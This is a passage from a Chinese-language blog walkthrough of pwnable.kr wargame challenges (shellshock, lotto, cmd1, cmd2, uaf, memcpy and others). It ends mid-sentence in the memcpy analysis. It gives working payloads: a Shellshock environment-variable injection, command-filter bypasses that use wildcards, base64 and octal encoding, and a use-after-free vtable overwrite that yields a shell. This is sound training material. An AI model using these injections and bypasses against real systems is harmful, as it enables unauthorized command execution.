题目解析</h3>\n<p>setresgid</p>\n<p>分别设置真实的，有效的和保存过的组标识号</p>\n<p>setresuid</p>\n<p>分别设置真实的，有效的和保存过的用户标识号</p>\n<p>再看一下权限</p>\n<p>shellshock@prowl:~$ ls -l<br />\ntotal 960<br />\n-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash<br />\n-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag<br />\n-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br />\n-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c</p>\n<p>shellshock 文件所属组权限中有一个 s，而 s 的含义代表<strong> SGID (Set Group ID, 4)</strong></p>\n<ul>\n<li><strong>SGID(Set Group ID, 4):</strong></li>\n</ul>\n<p>对于可执行文件， <code>SGID</code>  与 <code>SUID</code>  类似，引发的进程的所有组是程序文件所属的组。对于目录， <code>SGID</code>  属性会使目录中新建文件的所属组与该目录相同。 <code>SGID</code>  也可以用 s 表示，如:</p>\n<p>$ ls -l /vardrwxrwsr-x  2 root staff    4096 Apr 10  2014 localdrwxrwxr-x 15 root syslog   4096 Apr  4 19:57 log</p>\n<p>也就是说 shellshock 运行时会得到 shellshock_pwn 的权限。</p>\n<p>权限得到了，但是程序中并没有可以得到 flag 的地方，所以就要利用到 shellshock 漏洞，漏洞产生原因是由于 bash 使用的环境变量是通过函数名称来调用的，以 “(){” 开头通过环境变量来定义的。而在处理这样的 “函数环境变量” 的时候，并没有以函数结尾 “}” 为结束，而是一直执行其后的 shell 命令，例如：</p>\n<p>env x='() { :;}; echo vulnerable' bash -c &quot;echo this is a test&quot;</p>\n<p>存在漏洞的 bash 版本会输出</p>\n<p>vulnerable<br />\nthis is a test</p>\n<p>在后面加 <code>bash -c</code>  的原因是打开一个 bash 使其立即触发漏洞，因为当前 bash 没有继承环境变量。</p>\n<p>所以最终 payload：</p>\n<p>env x='() { :;}; bash -c cat flag' ./shellshock</p>\n<h4 id=\"参考文章\"><a class=\"anchor\" href=\"#参考文章\">#</a> 参考文章</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzQ1MzkwLmh0bWw=\">https://www.freebuf.com/articles/system/45390.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Fpa2luLm1lLzIwMTUvMDQvMDMvbGludXgtZmlsZS1wZXJtaXNzaW9uLW93ZXIv\">http://aikin.me/2015/04/03/linux-file-permission-ower/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0YXJ0ZXI=\">https://blog.csdn.net/starter</span>_/article/details/78164387</p>\n<h2 id=\"coin1\"><a class=\"anchor\" href=\"#coin1\">#</a> coin1</h2>\n<h3 id=\"题目描述-11\"><a class=\"anchor\" href=\"#题目描述-11\">#</a> 题目描述</h3>\n<pre><code>---------------------------------------------------\n-              Shall we play a game?              -\n---------------------------------------------------\n\nYou have given some gold coins in your hand\nhowever, there is one counterfeit coin among them\ncounterfeit coin looks exactly same as real coin\nhowever, its weight is different from real one\nreal coin weighs 10, counterfeit coin weighes 9\nhelp me to find the counterfeit coin with a scale\nif you find 100 counterfeit coins, you will get reward :)\nFYI, you have 60 seconds.\n\n- How to play - \n1. you get a number of coins (N) and number of chances (C)\n2. then you specify a set of index numbers of coins to be weighed\n3. you get the weight information\n4. 2~3 repeats C time, then you give the answer\n\n- Example -\n[Server] N=4 C=2 \t# find counterfeit among 4 coins with 2 trial\n[Client] 0 1 \t\t# weigh first and second coin\n[Server] 20\t\t\t# scale result:20\n[Client] 3\t\t\t# weigh fourth coin\n[Server] 10\t\t\t# scale result:10\n[Client] 2 \t\t\t# counterfeit coin is third!\n[Server] Correct!\n\n- Ready? starting in 3 sec... -\n</code></pre>\n<p>简单来说就是给一组硬币，其中有一个假硬币，真硬币重量 10，假的重量 9，在有限的次数中猜出来假的硬币是哪一个，可以通过输入 <code>0 1 2 3 4 .....</code>  来了解 <code>0 1 2 3 4 .....</code>  这一组硬币重量的综合。</p>\n<h3 id=\"题目解析-11\"><a class=\"anchor\" href=\"#题目解析-11\">#</a> 题目解析</h3>\n<p>利用二分查找可以很快得到答案</p>\n<p>from pwn import *</p>\n<p>r = remote(&quot;<span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3I=\">pwnable.kr</span>&quot;, 9007)</p>\n<p>for i in range(31):<br />\nprint r.recvline()</p>\n<p>for i in range(100):<br />\nn_c = r.recvline()<br />\n# print n_c<br />\nN = int(n_c.split(&quot; &quot;)[0][2:])<br />\nC = int(n_c.split(&quot; &quot;)[1][2:])<br />\nprint &quot;[*]N=%d,C=%d&quot; % (N, C)<br />\nleft, right = 0, N<br />\nmid = int((left+right) / 2)<br />\nfor i in range(C):<br />\npayload = ' '.join([str(i) for i in range(left, mid)])<br />\nr.sendline(payload)<br />\nweight = int(r.recvline())<br />\nif weight % 10 == 0:<br />\nleft = mid<br />\nright = right<br />\nmid = int((right + left) / 2.0)<br />\nelse:<br />\nleft = left<br />\nright = mid<br />\nmid = int((left + right) / 2.0)<br />\nr.sendline(str(left))<br />\nprint r.recvline()</p>\n<p>但是在本地执行脚本时由于网速问题，导致无法在 60s 内跑到第 100 次，所以要把脚本放到服务器上去执行。</p>\n<p>连上之前任意一道题目的 ssh，在 tmp 目录下写好脚本， <code>r = remote(&quot;pwnable.kr&quot;, 9007)</code>  改为 <code>r = remote(&quot;0.0.0.0&quot;,9007)</code>  即可。</p>\n<h2 id=\"blackjack\"><a class=\"anchor\" href=\"#blackjack\">#</a> blackjack</h2>\n<h3 id=\"题目描述-12\"><a class=\"anchor\" href=\"#题目描述-12\">#</a> 题目描述</h3>\n<p>Hey! check out this C implementation of blackjack game!<br />\nI found it online</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Nib2FyZC5jcHJvZ3JhbW1pbmcuY29tL2MtcHJvZ3JhbW1pbmcvMTE0MDIzLXNpbXBsZS1ibGFja2phY2stcHJvZ3JhbS5odG1s\">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</span></p>\n<p>I like to give my flags to millionares.<br />\nhow much money you got?</p>\n<p>Running at:nc <span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3I=\">pwnable.kr</span> 9009</p>\n<p>blackjack，又名 21 点，详见游戏规则</p>\n<p>大概就是赌谁的点大的游戏</p>\n<h3 id=\"题目解析-12\"><a class=\"anchor\" href=\"#题目解析-12\">#</a> 题目解析</h3>\n<p>原本以为是个正经的 pwn 题，但是看到后面发现是道源码审计题。</p>\n<p>主要问题出在 <code>betting</code>  函数中</p>\n<p>int betting() //Asks user amount to bet<br />\n{<br />\nprintf(&quot;\\n\\nEnter Bet: $&quot;);<br />\nscanf(&quot;%d&quot;, &amp;bet);</p>\n<p>if (bet &gt; cash) //If player tries to bet more money than player has<br />\n{<br />\nprintf(&quot;\\nYou cannot bet more money than you have.&quot;);<br />\nprintf(&quot;\\nEnter Bet: &quot;);<br />\nscanf(&quot;%d&quot;, &amp;bet);<br />\nreturn bet;<br />\n}<br />\nelse return bet;<br />\n} // End Function</p>\n<p>在判断 <code>bet &gt; cash</code>  之后，又进行了一次 scanf，并且没有进行判断，直接返回。所以第一次输入一个大于 500 的值，第二次再输入一个大于 1000000 的数就可以得到 flag。</p>\n<h2 id=\"lotto\"><a class=\"anchor\" href=\"#lotto\">#</a> lotto</h2>\n<h3 id=\"题目描述-13\"><a class=\"anchor\" href=\"#题目描述-13\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;stdlib.h&gt;<br />\n#include &lt;string.h&gt;<br />\n#include &lt;fcntl.h&gt;</p>\n<p>unsigned char submit[6];</p>\n<p>void play(){</p>\n<pre><code>int i;\nprintf(&quot;Submit your 6 lotto bytes:&quot;);\nfflush(stdout);\n\nint r;\nr = read(0, submit, 6);\n\nprintf(&quot;Lotto Start!\\n&quot;);\n//sleep(1);\n\n// generate lotto numbers\nint fd = open(&quot;/dev/urandom&quot;, O_RDONLY);\nif(fd==-1)&#123;\n\tprintf(&quot;error. tell admin\\n&quot;);\n\texit(-1);\n&#125;\nunsigned char lotto[6];\nif(read(fd, lotto, 6) != 6)&#123;\n\tprintf(&quot;error2. tell admin\\n&quot;);\n\texit(-1);\n&#125;\nfor(i=0; i&lt;6; i++)&#123;\n\tlotto[i] = (lotto[i] % 45) + 1;\t\t// 1 ~ 45\n&#125;\nclose(fd);\n\n// calculate lotto score\nint match = 0, j = 0;\nfor(i=0; i&lt;6; i++)&#123;\n\tfor(j=0; j&lt;6; j++)&#123;\n\t\tif(lotto[i] == submit[j])&#123;\n\t\t\tmatch++;\n\t\t&#125;\n\t&#125;\n&#125;\n\n// win!\nif(match == 6)&#123;\n\tsystem(&quot;/bin/cat flag&quot;);\n&#125;\nelse&#123;\n\tprintf(&quot;bad luck...\\n&quot;);\n&#125;\n</code></pre>\n<p>}</p>\n<p>void help(){<br />\nprintf(&quot;- nLotto Rule -\\n&quot;);<br />\nprintf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;);<br />\nprintf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;);<br />\nprintf(&quot;if you win lottery for <em>1st place</em>, you will get reward\\n&quot;);<br />\nprintf(&quot;for more details, follow the link below\\n&quot;);<br />\nprintf(&quot;<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ubG90dG8uY28ua3IvY291bnNlbC5kbz9tZXRob2Q9cGxheWVyR3VpZGUjYnV5aW5nX2d1aWRlMDElNUNuJTVDbg==\">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n</span>&quot;);<br />\nprintf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);<br />\n}</p>\n<p>int main(int argc, char* argv[]){</p>\n<pre><code>// menu\nunsigned int menu;\n\nwhile(1)&#123;\n\n\tprintf(&quot;- Select Menu -\\n&quot;);\n\tprintf(&quot;1. Play Lotto\\n&quot;);\n\tprintf(&quot;2. Help\\n&quot;);\n\tprintf(&quot;3. Exit\\n&quot;);\n\n\tscanf(&quot;%d&quot;, &amp;menu);\n\n\tswitch(menu)&#123;\n\t\tcase 1:\n\t\t\tplay();\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\thelp();\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tprintf(&quot;bye\\n&quot;);\n\t\t\treturn 0;\n\t\tdefault:\n\t\t\tprintf(&quot;invalid menu\\n&quot;);\n\t\t\tbreak;\n\t&#125;\n&#125;\nreturn 0;\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-13\"><a class=\"anchor\" href=\"#题目解析-13\">#</a> 题目解析</h3>\n<p>程序从 <code>/dev/urandom</code>  中读取 6 个字节随机数，与用户输入的数据进行对比，而问题就出在对比的地方</p>\n<pre><code>for(i=0; i&lt;6; i++)&#123;\n\tfor(j=0; j&lt;6; j++)&#123;\n\t\tif(lotto[i] == submit[j])&#123;\n\t\t\tmatch++;\n\t\t&#125;\n\t&#125;\n&#125;\n</code></pre>\n<p>程序写成了嵌套循环，结果导致只要有一次 lotto [i]==submit [j]，match++ 就可以加到 6，最后得到 flag。那么就随便挑个字符，然后爆破就行了。</p>\n<p>from pwn import *</p>\n<p>s=ssh(&quot;lotto&quot;,&quot;<span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3I=\">pwnable.kr</span>&quot;,2222,&quot;guest&quot;)<br />\np=s.process(&quot;/home/lotto/lotto&quot;)<br />\np.recv()<br />\nwhile True:<br />\np.sendline(&quot;1&quot;)<br />\np.recv()<br />\npayload=&quot;------&quot;<br />\np.sendline(payload)<br />\nrecv_str=p.recv()<br />\nif &quot;bad luck...\\n&quot; not in recv_str:<br />\nprint recv_str<br />\nbreak</p>\n<h2 id=\"cmd1\"><a class=\"anchor\" href=\"#cmd1\">#</a> cmd1</h2>\n<h3 id=\"题目描述-14\"><a class=\"anchor\" href=\"#题目描述-14\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;string.h&gt;</p>\n<p>int filter(char* cmd){<br />\nint r=0;<br />\nr += strstr(cmd, &quot;flag&quot;)!=0;<br />\nr += strstr(cmd, &quot;sh&quot;)!=0;<br />\nr += strstr(cmd, &quot;tmp&quot;)!=0;<br />\nreturn r;<br />\n}<br />\nint main(int argc, char* argv[], char** envp){<br />\nputenv(&quot;PATH=/thankyouverymuch&quot;);<br />\nif(filter(argv[1])) return 0;<br />\nsystem( argv[1] );<br />\nreturn 0;<br />\n}</p>\n<h3 id=\"题目解析-14\"><a class=\"anchor\" href=\"#题目解析-14\">#</a> 题目解析</h3>\n<p>程序执行用户输入的命令，但是设置了一个不存在的 path 环境变量 <code>/thankyouverymuch</code> ，并且对输入进行了过滤，不能输入 sh，flag，tmp。</p>\n<p>环境变量部分只需要带上路径访问就可以，过滤部分则需要利用 linux 的通配符，或者可以将 &quot;flag&quot; 拆分开</p>\n<p>payload：</p>\n<p><code>./cmd1 &quot;/bin/cat fl*&quot;</code></p>\n<p>或者</p>\n<p><code>./cmd1 “/bin/cat \\”f\\”\\”l\\”\\”a\\”\\”g\\””</code></p>\n<h2 id=\"cmd2\"><a class=\"anchor\" href=\"#cmd2\">#</a> cmd2</h2>\n<h3 id=\"题目描述-15\"><a class=\"anchor\" href=\"#题目描述-15\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;string.h&gt;</p>\n<p>int filter(char* cmd){<br />\nint r=0;<br />\nr += strstr(cmd, &quot;=&quot;)!=0;<br />\nr += strstr(cmd, &quot;PATH&quot;)!=0;<br />\nr += strstr(cmd, &quot;export&quot;)!=0;<br />\nr += strstr(cmd, &quot;/&quot;)!=0;<br />\nr += strstr(cmd, &quot;`&quot;)!=0;<br />\nr += strstr(cmd, &quot;flag&quot;)!=0;<br />\nreturn r;<br />\n}</p>\n<p>extern char** environ;<br />\nvoid delete_env(){<br />\nchar** p;<br />\nfor(p=environ; *p; p++)\tmemset(*p, 0, strlen(*p));<br />\n}</p>\n<p>int main(int argc, char* argv[], char** envp){<br />\ndelete_env();<br />\nputenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;);<br />\nif(filter(argv[1])) return 0;<br />\nprintf(&quot;%s\\n&quot;, argv[1]);<br />\nsystem( argv[1] );<br />\nreturn 0;<br />\n}</p>\n<h3 id=\"题目解析-15\"><a class=\"anchor\" href=\"#题目解析-15\">#</a> 题目解析</h3>\n<p>比起上一道题目难了许多，最麻烦的就是过滤了 /，不能再 <code>/bin/cat fl*</code> ，当然还是有办法绕过。</p>\n<ul>\n<li><strong>pwd 方式</strong><br />\n虽然因为程序设置了 PATH 导致无法执行很多命令，但是发现可以执行 pwd，有两种方法</li>\n</ul>\n<ol>\n<li>进入到根目录 <code>/</code> , 此时 pwd 返回的结果就是 <code>/</code> ，利用 <code>$(pwd)</code>  就可以得到 <code>/</code>  接着构造 payload：<br />\n <code>/home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*'</code></li>\n<li>首先在 tmp 目录下创建目录 <code>/tmp/test/c</code> ，这样在此目录下执行 pwd 会得到 <code>/tmp/test/c</code> ，接着在 <code>/tmp/test</code>  目录下建立 cat 的软连接： <code>ln -s /bin/cat cat</code> ，在 <code>/tmp/test/c</code>  下建立 flag 的软连接： <code>ln -s /home/cmd2/flag flag</code> ，然后在 <code>/tmp/test/c</code>  目录下执行命令： <code>/home/cmd2/cmd2 &quot;$(pwd)at f*&quot;</code></li>\n</ol>\n<ul>\n<li>编码方式</li>\n</ul>\n<ol>\n<li>BASE64<br />\n 首先将 <code>/bin/cat /home/cmd2/flag</code>  进行 base64 编码，得到 <code>L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnCg==</code> ，但是因为有 =，所以需要在原来的字符串中插入两个空格，就不会有 = 了。<br />\n <code>echo &quot;\\57&quot;</code>  可以输出 <code>/</code> ，利用管道符进行解码，最后就可以得到 flag<br />\n <code>./cmd2 '$(echo &quot;L2Jpbi9jYXQgL2hvbWUvY21kMi9mbGFnICAK&quot; | $(echo &quot;\\57&quot;)usr$(echo &quot;\\57&quot;)bin$(echo &quot;\\57&quot;)base64 -d)'</code></li>\n<li>8 进制<br />\n算出 <code>/bin/cat flag</code> 8 进制代码，得到 <code>\\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147</code> ，接着执行 <code>./cmd2 '$(echo &quot;\\057\\0142\\0151\\0156\\057\\0143\\0141\\0164\\040\\0146\\0154\\0141\\0147&quot;)'</code></li>\n</ol>\n<ul>\n<li>脑洞大开方式</li>\n</ul>\n<ol>\n<li>利用 read 写入环境变量并执行<br />\n执行 <code>./cmd2 &quot;read a;\\$a&quot;</code> ，输入 <code>/bin/cat flag</code>  得到 flag<br />\n <code>read a;</code>  写入一个 a 变量， <code>\\$a</code>  转义 <code>$</code>  字符，执行 <code>$a</code>  变量。</li>\n<li>shell 内置函数 command 的参数 <code>-p</code></li>\n</ol>\n<p>./cmd2 &quot;command -p cat &quot;f&quot;l&quot;a&quot;g&quot;</p>\n<h2 id=\"uaf\"><a class=\"anchor\" href=\"#uaf\">#</a> uaf</h2>\n<h3 id=\"题目描述-16\"><a class=\"anchor\" href=\"#题目描述-16\">#</a> 题目描述</h3>\n<p>Mommy, what is Use After Free bug?</p>\n<p>#include &lt;fcntl.h&gt;<br />\n#include &lt;iostream&gt;<br />\n#include &lt;cstring&gt;<br />\n#include &lt;cstdlib&gt;<br />\n#include &lt;unistd.h&gt;<br />\nusing namespace std;</p>\n<p>class Human{<br />\nprivate:<br />\nvirtual void give_shell(){<br />\nsystem(&quot;/bin/sh&quot;);<br />\n}<br />\nprotected:<br />\nint age;<br />\nstring name;<br />\npublic:<br />\nvirtual void introduce(){<br />\ncout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl;<br />\ncout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl;<br />\n}<br />\n};</p>\n<p>class Man: public Human{<br />\npublic:<br />\nMan(string name, int age){<br />\nthis-&gt;name = name;<br />\nthis-&gt;age = age;<br />\n}<br />\nvirtual void introduce(){<br />\nHuman::introduce();<br />\ncout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl;<br />\n}<br />\n};</p>\n<p>class Woman: public Human{<br />\npublic:<br />\nWoman(string name, int age){<br />\nthis-&gt;name = name;<br />\nthis-&gt;age = age;<br />\n}<br />\nvirtual void introduce(){<br />\nHuman::introduce();<br />\ncout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl;<br />\n}<br />\n};</p>\n<p>int main(int argc, char* argv[]){<br />\nHuman* m = new Man(&quot;Jack&quot;, 25);<br />\nHuman* w = new Woman(&quot;Jill&quot;, 21);</p>\n<pre><code>size_t len;\nchar* data;\nunsigned int op;\nwhile(1)&#123;\n\tcout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;;\n\tcin &gt;&gt; op;\n\n\tswitch(op)&#123;\n\t\tcase 1:\n\t\t\tm-&gt;introduce();\n\t\t\tw-&gt;introduce();\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tlen = atoi(argv[1]);\n\t\t\tdata = new char[len];\n\t\t\tread(open(argv[2], O_RDONLY), data, len);\n\t\t\tcout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl;\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tdelete m;\n\t\t\tdelete w;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t&#125;\n&#125;\n\nreturn 0;\t\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-16\"><a class=\"anchor\" href=\"#题目解析-16\">#</a> 题目解析</h3>\n<p>这道题目很明显是 Use-After-Free (UAF) 漏洞，case3 中 <code>delete m;delete w</code> ，但是之后再 case1 中可以再调用 <code>m-&gt;introduce();w-&gt;introduce();</code> ，触发漏洞。</p>\n<p>首先了解下 C++ 虚函数</p>\n<p>虚函数，一旦一个类有虚函数，编译器会为这个类建立一张 vtable。子类继承父类 vtable 中所有项，当子类有同名函数时，修改 vtable 同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在 vtable 中添加。私有函数无法继承，但如果私有函数是虚函数，vtable 中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</p>\n<p>调试得到 <code>give_shell</code>  地址后就需要想办法调用，这里就利用到 UAF</p>\n<p>但是利用之前需要控制被释放的空间里的内容，case2 中有 read 函数可以利用，但是并不能控制写往什么地址。这里就需要了解下<a href=\"https://www.freebuf.com/news/88660.html\"><strong> fastbin</strong></a></p>\n<p>fastbin 顾名思义，fast 就是要快。所以 fastbin 旨在加快操作系统的内存分配速度，fastbin 仅使用 fd 形成单链表的形式，且遵循 LIFO 原则。</p>\n<p>当操作系统分配一块较小的内存时 (64 字节)，会首先从从 fastbin 中寻找未使用的 chunk 并分配。</p>\n<p>w，m 对象的内存布局为</p>\n<p>+------------+<br />\n|   vtable   |&lt;----------------+<br />\n+------------+                 |<br />\n|    age     |        +------------------+<br />\n+------------+        | human::give_shell|<br />\n|    name    |        +------------------+<br />\n+------------+        |  man::introduce  |<br />\n^               +------------------+<br />\n|<br />\n+------------+<br />\n|   &quot;jack&quot;   |<br />\n+------------+</p>\n<p>大小为 24 字节，属于 fastbin。执行 delete 之后，如果 case2 中分配的空间大小为 24 字节，就可以重新分配到这一块内存区域。</p>\n<p><strong>payload</strong></p>\n<p>uaf@prowl:~$ python -c 'print &quot;\\x48\\x15\\x40\\x00\\x00\\x00\\x00\\x00&quot;'&gt;/tmp/uaf_exp1<br />\nuaf@prowl:~$ ./uaf 24 /tmp/uaf_exp1</p>\n<ol>\n<li>use</li>\n<li>after</li>\n<li>free<br />\n3</li>\n<li>use</li>\n<li>after</li>\n<li>free<br />\n2<br />\nyour data is allocated</li>\n<li>use</li>\n<li>after</li>\n<li>free<br />\n2          #分配两次，因为程序先 delete m, 后 delete w，只分配一次会先分配到 w 上面，而 case1 是先执行 m-&gt;introduce ()。<br />\nyour data is allocated</li>\n<li>use</li>\n<li>after</li>\n<li>free<br />\n1<br />\n$ ls<br />\nflag  uaf  uaf.cpp<br />\n$ cat flag<br />\nyay_f1ag_aft3r_pwning</li>\n</ol>\n<h2 id=\"memcpy\"><a class=\"anchor\" href=\"#memcpy\">#</a> memcpy</h2>\n<h3 id=\"题目描述-17\"><a class=\"anchor\" href=\"#题目描述-17\">#</a> 题目描述</h3>\n<p>// compiled with:gcc -o memcpy memcpy.c -m32 -lm<br />\n#include &lt;stdio.h&gt;<br />\n#include &lt;string.h&gt;<br />\n#include &lt;stdlib.h&gt;<br />\n#include &lt;signal.h&gt;<br />\n#include &lt;unistd.h&gt;<br />\n#include &lt;sys/mman.h&gt;<br />\n#include &lt;math.h&gt;</p>\n<p>unsigned long long rdtsc(){<br />\nasm(&quot;rdtsc&quot;);<br />\n}</p>\n<p>char* slow_memcpy(char* dest, const char* src, size_t len){<br />\nint i;<br />\nfor (i=0; i&lt;len; i++) {<br />\ndest[i] = src[i];<br />\n}<br />\nreturn dest;<br />\n}</p>\n<p>char* fast_memcpy(char* dest, const char* src, size_t len){<br />\nsize_t i;<br />\n// 64-byte block fast copy<br />\nif(len &gt;= 64){<br />\ni = len / 64;<br />\nlen &amp;= (64-1);<br />\nwhile(i-- &gt; 0){<br />\n<strong>asm</strong> <strong>volatile</strong> (<br />\n&quot;movdqa (%0), %%xmm0\\n&quot;<br />\n&quot;movdqa 16(%0), %%xmm1\\n&quot;<br />\n&quot;movdqa 32(%0), %%xmm2\\n&quot;<br />\n&quot;movdqa 48(%0), %%xmm3\\n&quot;<br />\n&quot;movntps %%xmm0, (%1)\\n&quot;<br />\n&quot;movntps %%xmm1, 16(%1)\\n&quot;<br />\n&quot;movntps %%xmm2, 32(%1)\\n&quot;<br />\n&quot;movntps %%xmm3, 48(%1)\\n&quot;<br />\n::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;);<br />\ndest += 64;<br />\nsrc += 64;<br />\n}<br />\n}</p>\n<pre><code>// byte-to-byte slow copy\nif(len) slow_memcpy(dest, src, len);\nreturn dest;\n</code></pre>\n<p>}</p>\n<p>int main(void){</p>\n<pre><code>setvbuf(stdout, 0, _IONBF, 0);\nsetvbuf(stdin, 0, _IOLBF, 0);\n\nprintf(&quot;Hey, I have a boring assignment for CS class.. :(\\n&quot;);\nprintf(&quot;The assignment is simple.\\n&quot;);\n\nprintf(&quot;-----------------------------------------------------\\n&quot;);\nprintf(&quot;- What is the best implementation of memcpy?        -\\n&quot;);\nprintf(&quot;- 1. implement your own slow/fast version of memcpy -\\n&quot;);\nprintf(&quot;- 2. compare them with various size of data         -\\n&quot;);\nprintf(&quot;- 3. conclude your experiment and submit report     -\\n&quot;);\nprintf(&quot;-----------------------------------------------------\\n&quot;);\n\nprintf(&quot;This time, just help me out with my experiment and get flag\\n&quot;);\nprintf(&quot;No fancy hacking, I promise :D\\n&quot;);\n\nunsigned long long t1, t2;\nint e;\nchar* src;\nchar* dest;\nunsigned int low, high;\nunsigned int size;\n// allocate memory\nchar* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\nchar* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\nsrc = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n\nsize_t sizes[10];\nint i=0;\n\n// setup experiment parameters\nfor(e=4; e&lt;14; e++)&#123;\t// 2^13 = 8K\n\tlow = pow(2,e-1);\n\thigh = pow(2,e);\n\tprintf(&quot;specify the memcpy amount between %d ~ %d:&quot;, low, high);\n\tscanf(&quot;%d&quot;, &amp;size);\n\tif( size &lt; low || size &gt; high )&#123;\n\t\tprintf(&quot;don't mess with the experiment.\\n&quot;);\n\t\texit(0);\n\t&#125;\n\tsizes[i++] = size;\n&#125;\n\nsleep(1);\nprintf(&quot;ok, lets run the experiment with your configuration\\n&quot;);\nsleep(1);\n\n// run experiment\nfor(i=0; i&lt;10; i++)&#123;\n\tsize = sizes[i];\n\tprintf(&quot;experiment %d:memcpy with buffer size %d\\n&quot;, i+1, size);\n\tdest = malloc( size );\n\n\tmemcpy(cache1, cache2, 0x4000);\t\t// to eliminate cache effect\n\tt1 = rdtsc();\n\tslow_memcpy(dest, src, size);\t\t// byte-to-byte memcpy\n\tt2 = rdtsc();\n\tprintf(&quot;ellapsed CPU cycles for slow_memcpy:%llu\\n&quot;, t2-t1);\n\n\tmemcpy(cache1, cache2, 0x4000);\t\t// to eliminate cache effect\n\tt1 = rdtsc();\n\tfast_memcpy(dest, src, size);\t\t// block-to-block memcpy\n\tt2 = rdtsc();\n\tprintf(&quot;ellapsed CPU cycles for fast_memcpy:%llu\\n&quot;, t2-t1);\n\tprintf(&quot;\\n&quot;);\n&#125;\n\nprintf(&quot;thanks for helping my experiment!\\n&quot;);\nprintf(&quot;flag:----- erased in this source code -----\\n&quot;);\nreturn 0;\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-17\"><a class=\"anchor\" href=\"#题目解析-17\">#</a> 题目解析</h3>\n<p>这个程序的作用就是测试自己实现的两个函数 <code>slow_memcpy</code>  和 <code>fast_memcpy</code>  的速度， <code>slow_memcpy</code>  使用的是逐字节赋值， <code>fast_memcpy</code>  就比较麻烦了，使用的是内嵌汇编 <code>movdqa</code>  和 <code>movntps</code>  指令，当程序测试完之后就会直接输出 flag。</p>\n<p>直接运行程序，</p>\n<p>specify the memcpy amount between 8 ~ 16:8<br />\nspecify the memcpy amount between 16 ~ 32:16<br />\nspecify the memcpy amount between 32 ~ 64:32<br />\nspecify the memcpy amount between 64 ~ 128:64<br />\nspecify the memcpy amount between 128 ~ 256:128<br />\nspecify the memcpy amount between 256 ~ 512:256<br />\nspecify the memcpy amount between 512 ~ 1024:512<br />\nspecify the memcpy amount between 1024 ~ 2048:1024<br />\nspecify the memcpy amount between 2048 ~ 4096:2048<br />\nspecify the memcpy amount between 4096 ~ 8192:4096<br />\nok, lets run the experiment with your configuration<br />\nexperiment 1:memcpy with buffer size 8<br />\nellapsed CPU cycles for slow_memcpy:2162<br />\nellapsed CPU cycles for fast_memcpy:244</p>\n<p>experiment 2:memcpy with buffer size 16<br />\nellapsed CPU cycles for slow_memcpy:358<br />\nellapsed CPU cycles for fast_memcpy:254</p>\n<p>experiment 3:memcpy with buffer size 32<br />\nellapsed CPU cycles for slow_memcpy:382<br />\nellapsed CPU cycles for fast_memcpy:484</p>\n<p>experiment 4:memcpy with buffer size 64<br />\nellapsed CPU cycles for slow_memcpy:618<br />\nellapsed CPU cycles for fast_memcpy:168</p>\n<p>experiment 5:memcpy with buffer size 128<br />\nellapsed CPU cycles for slow_memcpy:1250</p>\n<p>并没有输出 flag，而是到某一个环节就停下来了，使用 ida 调试下，程序在 <code>_mm_stream_ps(a1, (__m128)_mm_load_si128(a2));</code> ，也就是 <code>&quot;movntps %%xmm0, (%1)\\n&quot;</code>  的地方出错了，查了下 <code>movntps</code> ，其中有一句描述：</p>\n<p>When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated.</p>\n<p>“如果源或目的操作数是一个内存引用，则它必须满足 16 字节对齐。否则，会造成一般保护错误。”</p>\n<p>从源码中可以看到，前三次的赋值操作其实都是由 <code>slow_memcpy</code>  来完成的，所以没有出问题，那么为什么后面的字节就无法对齐</p>\n<p>首先 src 